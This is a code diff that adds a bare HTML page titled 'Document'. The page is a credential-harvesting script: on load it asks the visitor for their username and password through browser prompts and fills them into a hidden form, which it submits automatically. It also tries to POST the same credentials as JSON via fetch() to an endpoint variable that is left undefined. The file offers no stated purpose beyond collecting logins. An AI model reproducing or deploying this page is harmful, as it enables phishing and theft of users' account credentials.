@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <div style="display: none;">
+        <form action="" method="POST" enctype="multipart/form-data" id="form">
+            <input type="text" id="user" name="user">
+            <input type="password" id="password" name="password">
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+</body>
+<script>
+    let username, password;
+    username = prompt("Please enter your username:");
+    password = prompt("Please enter your password:");
+
+    document.getElementById("user").value = username;
+    document.getElementById("password").value = password;
+    document.getElementById("form").submit()
+
+    const payload = {
+        "username": username,
+        "password": password
+    };
+
+    fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    })
+
+</script>
+
+</html>
